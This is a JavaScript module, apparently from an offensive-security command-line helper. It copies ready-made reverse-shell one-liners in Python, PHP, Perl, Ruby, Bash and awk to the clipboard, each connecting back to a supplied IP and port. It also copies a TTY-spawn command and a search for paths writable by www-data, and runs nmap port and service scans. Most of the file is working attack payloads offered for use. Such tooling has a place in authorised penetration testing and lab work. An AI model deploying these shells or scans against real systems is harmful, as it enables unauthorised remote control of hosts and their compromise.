import {EOL} from 'os';
// import {promisify} from 'util';
// import {appendFile} from 'fs-extra';
import execa from 'execa';
import Conf from 'conf';
import clipboard from 'clipboardy';
import commandExists from 'command-exists';

// const append = promisify(appendFile);

const PRIMARY_SCANNER = 'masscan';
const SECONDARY_SCANNER = 'nmap';

const store = new Conf();

export default {
    copy: {/* eslint-disable max-len */
        'reverse shell (python)': [
            {
                text: 'Copy Python reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (php)': [
            {
                text: 'Copy PHP reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (perl)': [
            {
                text: 'Copy Perl reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (ruby)': [
            {
                text: 'Copy Ruby reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (bash)': [
            {
                text: 'Copy Bash reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (awk)': [
            {
                text: 'Copy awk reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'spawn a TTY shell (linux)': [
            {
                text: 'Copy command to clipboard',
                task: async () => {
                    const cmd = `python -c 'import pty;pty.spawn("/bin/bash")`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'find files/folders with write access (linux)': [
            {
                text: 'Copy command to clipboard',
                task: async () => {
                    const cmd = `find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user  www-data -perm -u=w ')' -or '(' -group www-data -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ]
    }, /* eslint-enable max-len */
    scan: {
        port: [
            {
                text: 'Scan TCP ports with nmap',
                task: async () => {

                },
                condition: () => true,
                optional: () => commandExists.sync('nmap')
            },
            {
                text: 'You need to install nmap to scan a port...',
                task: async () => {},
                condition: () => false,
                optional: () => !commandExists.sync('nmap')
            }

        ],
        ports: [
            {
                text: 'Clear saved data',
                task: async () => {
                    store.clear();
                },
                condition: () => true
            },
            {
                text: `Find open ports with ${PRIMARY_SCANNER}`,
                task: async () => {

                },
                condition: () => commandExists.sync(PRIMARY_SCANNER),
                optional: () => commandExists.sync(PRIMARY_SCANNER)
            },
            {
                text: `Find open ports with ${SECONDARY_SCANNER}`,
                task: async ({ip}) => {
                    const {stdout} = await execa('nmap', [ip, '--open']);
                    const ports = stdout
                        .split(EOL)
                        .filter(line => line.includes('/tcp'))
                        .map(line => line.split('/')[0]);
                    store.set('ports', ports);
                },
                condition: () => commandExists.sync(SECONDARY_SCANNER) && !commandExists.sync(PRIMARY_SCANNER),
                optional: () => commandExists.sync(SECONDARY_SCANNER) && !commandExists.sync(PRIMARY_SCANNER)
            },
            {
                text: 'Enumerate services with nmap',
                task: async ({ip}) => {
                    const data = [];
                    const ports = store.get('ports');
                    for (const port of ports) {
                        const {stdout} = await execa('nmap', [ip, '-p', port, '-sV']);
                        stdout
                            .split(EOL)
                            .filter(line => line.includes('/tcp'))
                            .map(line => line.split(' ').filter(Boolean))
                            .forEach(([,, service, ...version]) => {
                                data.push({port, service, version: version.join(' ')});
                            });
                    }
                    store.set('data', data);
                },
                condition: () => commandExists.sync('nmap'),
                optional: () => commandExists.sync('nmap')
            },
            {
                text: 'You need to install masscan or nmap to run a scan...',
                task: async () => {},
                condition: () => false,
                optional: () => !(commandExists.sync(PRIMARY_SCANNER) || commandExists.sync(SECONDARY_SCANNER))
            }
        ]
    }
};